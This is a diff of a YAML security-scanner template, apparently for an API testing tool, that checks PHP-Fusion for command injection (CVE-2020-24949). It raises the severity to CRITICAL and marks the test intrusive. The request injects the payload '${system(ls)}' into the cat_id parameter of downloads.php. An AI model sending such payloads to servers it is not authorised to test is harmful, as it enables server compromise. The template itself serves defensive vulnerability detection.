@@ -2,20 +2,26 @@ id: PHPFUSION_RCE
 info:
   name: "PHP-Fusion Remote Code Execution"
   description: "PHP-Fusion is a content management system that has been found to have vulnerabilities allowing remote code execution (RCE). Attackers can exploit these weaknesses to inject malicious code through various input points, enabling them to execute arbitrary commands on the server. This poses a significant risk, as it can lead to full system compromise, data theft, and unauthorized access to sensitive information. Users are advised to update to the latest version to mitigate these risks."
-  details:  "The PHP-Fusion remote code execution vulnerability stems from insufficient input validation in certain components, allowing attackers to craft specially crafted requests. This exploitation can occur through file upload features or parameter manipulation, where malicious scripts can be executed on the server. The affected versions include those prior to specific security patches, making it crucial for users to identify and update their installations to secure versions. Attackers leveraging this vulnerability can gain control over the server environment, leading to serious security breaches."
+  details: "The PHP-Fusion remote code execution vulnerability stems from insufficient input validation in certain components, allowing attackers to craft specially crafted requests. This exploitation can occur through file upload features or parameter manipulation, where malicious scripts can be executed on the server. The affected versions include those prior to specific security patches, making it crucial for users to identify and update their installations to secure versions. Attackers leveraging this vulnerability can gain control over the server environment, leading to serious security breaches."
   impact: "Successful exploitation of the PHP-Fusion remote code execution vulnerability can lead to unauthorized access to the server, allowing attackers to execute arbitrary code. This could result in data theft, manipulation, or complete system compromise, impacting confidentiality, integrity, and availability. Additionally, it may facilitate further attacks within the network, potentially affecting connected systems and data. Organizations may also face reputational damage and regulatory repercussions due to the breach."
   category:
     name: COMMAND_INJECTION
     shortName: Command Injection
     displayName: Command Injection
   subCategory: PHPFUSION_RCE
-  severity: MEDIUM
+  severity: CRITICAL
   references:
     - "https://twitter.com/trbughunters/status/1283133356922884096"
   cwe:
     - CWE-77
   cve:
     - CVE-2020-24949
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
 
 api_selection_filters:
   method:
@@ -38,11 +44,11 @@ execute:
   type: single
   requests:
     - req:
-      - modify_url: "/infusions/downloads/downloads.php"
-      - modify_method: GET
-      - replace_body: '{}'
-      - add_query_param:
-          cat_id: "${system(ls)}"
+        - modify_url: "/infusions/downloads/downloads.php"
+        - modify_method: GET
+        - replace_body: '{}'
+        - add_query_param:
+            cat_id: "${system(ls)}"
 validate:
   response_code:
     eq: 200
